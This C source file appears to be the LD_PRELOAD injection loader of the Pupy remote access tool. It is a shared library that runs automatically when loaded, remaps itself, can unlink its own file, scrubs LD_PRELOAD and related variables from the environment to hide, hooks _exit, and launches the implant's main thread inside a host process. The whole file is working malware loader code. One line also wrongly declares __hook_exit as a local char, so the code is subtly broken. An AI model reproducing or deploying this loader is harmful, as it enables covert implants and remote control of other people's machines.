#define _GNU_SOURCE
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

#include <dlfcn.h>

#include "pupy_load.h"
#include "tmplibrary.h"
#include "debug.h"

static pthread_t thread_id;

static int __argc = 0;
static char ** __argv = NULL;
static char * __hook_exit = NULL;

static void *
thread_start(void *arg)
{
	return (void *) mainThread(__argc, __argv, true);
}

static
void unloader(void) {
	dprint("Wait until pupy thread exits\n");
	pthread_join(thread_id, NULL);
	dprint("Sutting down\n");
}

void _exit(int status) {
	dprint("Catch exit");
	__attribute__((noreturn))
		void (*orig_exit)(int status) = dlsym(RTLD_NEXT, "_exit");

	if (__hook_exit && !strcmp(__hook_exit, "1")) {
		dprint("Hook exit");
		unloader();
	}

	orig_exit(status);
}

static void _fill_argv(int argc, char* argv[], char* envp[]) {
	dprint("fill_argv called: %d/%p/%p\n", argc, argv, envp);
#ifdef DEBUG
	int i;
	for (i=0; i<argc; i++) {
		dprint("ARGV[%d] = %s\n", i, argv[i]);
	}
#endif

	__argc = argc;
	__argv = argv;

	while (*envp) {
		if ((strncmp(*envp, "LD_PRELOAD=", 11) == 0)
			|| strncmp(*envp, "CLEANUP=", 8) == 0
			|| strncmp(*envp, "HOOK_EXIT=", 10) == 0) {
			dprint("CLEAN %s\n", *envp);
			memset(*envp, 0, strlen(*envp));
		}
		envp++;
	}
}

__attribute__((section(".init_array"))) void (* pfill_argv)(int, char*[], char*[]) = _fill_argv;

__attribute__((constructor))
void loader() {
	pthread_attr_t attr;
	pthread_attr_init(&attr);

	char *ldpreload = getenv("LD_PRELOAD");
	char *cleanup = getenv("CLEANUP");
	char __hook_exit = getenv("HOOK_EXIT");

	if (ldpreload) {
		dprint("REMAP SELF\n0");
		remap(ldpreload);
	}

	if (cleanup && ldpreload && !strcmp(cleanup, "1")) {
		dprint("Cleanup requested. Cleanup %s\n", ldpreload);
		unlink(ldpreload);
	}

	if (ldpreload) {
		dprint("Unset LD_PRELOAD (%s)\n", ldpreload);
		unsetenv("LD_PRELOAD");
	}

	dprint("Start thread (LDPRELOAD=%s/%s)\n", ldpreload, getenv("LD_PRELOAD"));
	pthread_create(
		&thread_id, &attr,
		thread_start, NULL
	);
}
